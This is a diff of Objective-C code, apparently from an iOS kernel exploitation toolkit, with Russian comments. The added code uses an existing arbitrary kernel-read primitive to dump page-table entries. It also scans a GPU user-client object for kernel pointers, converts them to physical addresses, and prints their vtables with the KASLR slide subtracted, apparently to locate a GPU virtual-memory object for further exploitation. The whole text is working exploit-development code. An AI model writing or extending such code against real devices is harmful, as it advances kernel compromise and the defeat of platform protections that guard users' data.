@@ -5264,6 +5264,7 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
     }
     extern uint64_t kp_rc_kread64(uint64_t);
     extern uint64_t task_get_ipc_port_kobject(uint64_t, mach_port_t);
+    extern uint64_t kvtophys(uint64_t);
     extern uint64_t proc_self(void);
 
     // 1. open IOGPU user client — тип подбираем перебором
@@ -5443,12 +5444,37 @@ static void kpDumpPtrFields(NSMutableString *r, uint64_t objVA, const char *name
             kpNote(r, [NSString stringWithFormat:@"  pd=%u e2=%#llx → L3 pa=%#llx kv=%#llx", pd, e2, L3pa, L3]);
             uint64_t pte = L3 ? kp_rc_kread64(L3 + (uint64_t)pt * 8) : 0;
             kpNote(r, [NSString stringWithFormat:@"  pt=%u → PTE slot @ %#llx = %#llx (наш PA=%#llx)", pt, L3 ? L3 + pt * 8 : 0, pte, pa0]);
+            // соседние записи L3-таблицы — жива ли она вообще
+            if (L3) {
+                NSMutableString *nz = [NSMutableString stringWithString:@"  L3 nonzero:"];
+                int nnz = 0;
+                for (int j = 0; j < 2048 && nnz < 24; j++) {
+                    uint64_t e = kp_rc_kread64(L3 + (uint64_t)j * 8);
+                    if (e) { [nz appendFormat:@" [%d]=%#llx", j, e]; nnz++; }
+                }
+                if (!nnz) [nz appendString:@" (пустая)"];
+                kpNote(r, nz);
+            }
             // декод phys-окна из живого PTE
             if (pte) {
                 for (uint32_t sh = 0; sh <= 14; sh++)
                     if ((pte >> sh) == pa0 || ((pte >> sh) & 0x3FFFFFFFFFFFULL) == (pa0 & 0x3FFFFFFFFFFFULL))
                         kpNote(r, [NSString stringWithFormat:@"  phys-окно: PA = PTE >> %u", sh]);
             }
+        }
+        // 7. AGXUC: vtable каждого target'а полей — ищем GPU VM объект
+        kpNote(r, @"  --- AGXUC target vtables:");
+        for (uint32_t o = 0; o < 0x138; o += 8) {
+            uint64_t eu = kp_untag_ptr(kp_rc_kread64(agxuc + o));
+            if (!kpLooksLikeKernelPointer(eu)) continue;
+            uint64_t band = (eu >> 32) & 0xff;
+            if (!(band >= 0xdf && band <= 0xe8)) continue;
+            if (kpVAIsEL2Domain(eu)) continue;
+            uint64_t pa3 = kvtophys(eu);
+            if (!pa3 || !kpPAIsManaged(pa3)) continue;
+            uint64_t vt = kp_untag_ptr(kp_rc_kread64(eu));
+            kpNote(r, [NSString stringWithFormat:@"    uc+%#04x → %#llx  vt=%#llx (unslid %#llx)", o, eu, vt,
+                       vt ? vt - slide2 : 0]);
         }
     }
     return r;
